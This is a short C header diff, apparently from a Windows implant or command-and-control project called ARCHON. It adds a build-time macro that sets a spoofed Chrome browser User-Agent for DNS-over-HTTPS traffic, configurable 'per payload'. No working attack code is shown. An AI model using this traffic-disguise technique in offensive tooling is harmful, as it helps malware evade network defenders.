@@ -19,6 +19,13 @@
 #define ARCHON_MAGIC_VALUE 0xDEADBEEF
 #endif
 
+/* DoH User-Agent string — injected via -DARCHON_DOH_USER_AGENT="..." at build time.
+ * Override in CMakeLists.txt or pass -DARCHON_DOH_USER_AGENT="..." to the compiler
+ * to customize per payload without modifying source. */
+#ifndef ARCHON_DOH_USER_AGENT
+#define ARCHON_DOH_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+#endif
+
 #define WIN_VERSION_UNKNOWN 0
 #define WIN_VERSION_XP      1
 #define WIN_VERSION_VISTA   2
